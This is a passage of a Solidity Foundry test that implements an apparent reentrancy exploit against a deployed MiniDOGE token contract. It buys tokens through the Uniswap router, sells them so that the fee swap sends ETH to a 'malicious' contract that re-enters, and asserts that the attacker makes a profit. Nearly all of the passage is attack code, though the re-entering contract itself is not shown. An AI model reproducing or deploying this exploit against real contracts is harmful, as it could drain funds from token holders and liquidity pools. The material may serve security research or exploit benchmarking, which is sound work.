        // Give attacker some MiniDOGE tokens to work with
        deal(TARGET, attacker, 1000000 * 10**6 * 10**9);

        // Approve token spending
        MiniDOGE(TARGET).approve(address(malicious), type(uint256).max);

        // Initialize malicious contract with target address
        malicious.initialize(TARGET, attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // First, we need to accumulate fee tokens in the contract
        // We can do this by buying and selling tokens

        // Get the pair address
        address pair = MiniDOGE(TARGET).uniswapV2Pair();

        // Buy some tokens first to create liquidity
        address weth = IUniswapV2Router02(MiniDOGE(TARGET).uniswapV2Router()).WETH();
        deal(weth, attacker, 10 ether);
        IERC20(weth).approve(address(MiniDOGE(TARGET).uniswapV2Router()), type(uint256).max);

        // Buy tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        IUniswapV2Router02(MiniDOGE(TARGET).uniswapV2Router()).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Now sell tokens to accumulate fees in the contract
        // We need to sell enough to trigger the minimumTokensBeforeSwap
        uint256 tokenBalance = MiniDOGE(TARGET).balanceOf(attacker);
        MiniDOGE(TARGET).approve(address(MiniDOGE(TARGET).uniswapV2Router()), tokenBalance);

        path[0] = TARGET;
        path[1] = weth;

        // Record initial ETH balance
        uint256 initialEthBalance = address(this).balance;

        // Trigger the swap by selling tokens
        // This will call swapTokens which will send ETH to our malicious contract
        // The malicious contract will re-enter
        IUniswapV2Router02(MiniDOGE(TARGET).uniswapV2Router()).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2,  // Sell half
            0,
            path,
            address(malicious),  // Send to malicious contract first
            block.timestamp
        );

        // The malicious contract should have forwarded ETH to us
        // Check if our ETH balance increased
        uint256 finalEthBalance = address(this).balance;
        assertGt(finalEthBalance, initialEthBalance, "ETH balance should have increased");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

